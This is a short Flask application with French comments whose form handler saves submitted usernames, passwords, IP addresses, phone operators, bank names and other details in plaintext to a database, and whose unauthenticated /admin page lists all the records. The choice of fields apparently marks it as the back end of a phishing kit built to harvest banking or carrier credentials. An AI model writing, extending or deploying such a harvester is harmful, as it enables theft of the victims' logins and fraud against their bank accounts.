from flask import Flask, render_template, request, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime

app = Flask(__name__)

# 🔧 Configuration de la base PostgreSQL (remplace les valeurs par celles de Render)
import os
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# 🗃️ Modèle de données
class Submission(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.String)
    username = db.Column(db.String)
    password = db.Column(db.String)
    ip = db.Column(db.String)
    operator = db.Column(db.String)
    bank = db.Column(db.String)
    other_info = db.Column(db.String)

# 🏠 Page d'accueil avec le formulaire
@app.route('/')
def index():
    return render_template('index.html')

# 📥 Traitement du formulaire et enregistrement dans la base
@app.route('/traitement', methods=['POST'])
def traitement():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.form.get('ip')
    operator = request.form.get('operator')
    bank = request.form.get('bank')
    other_info = request.form.get('other_info')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        new_entry = Submission(
            timestamp=timestamp,
            username=username,
            password=password,
            ip=ip,
            operator=operator,
            bank=bank,
            other_info=other_info
        )
        db.session.add(new_entry)
        db.session.commit()
        print("✅ Données enregistrées :", timestamp, username)
    except Exception as e:
        print("❌ Erreur lors de l’enregistrement :", e)

    return redirect(url_for('confirmation'))

# ✅ Page de confirmation
@app.route('/confirmation')
def confirmation():
    return render_template('confirmation.html')

# 📊 Page admin avec filtre par date ou affichage complet
@app.route('/admin', methods=['GET', 'POST'])
def admin():
    selected_date = request.form.get('date') if request.method == 'POST' else ""
    
    try:
        if selected_date:
            entries = Submission.query.filter(Submission.timestamp.like(f"{selected_date}%")).all()
        else:
            entries = Submission.query.all()

        data = [
            f"{e.timestamp} | {e.username} | {e.password} | {e.ip} | {e.operator} | {e.bank} | {e.other_info}"
            for e in entries
        ]
    except Exception as e:
        print("❌ Erreur lors de la récupération :", e)
        data = []

    return render_template('admin.html', data=data, selected_date=selected_date)

# 🛠️ Initialisation de la base (à exécuter une seule fois)
with app.app_context():
    db.create_all()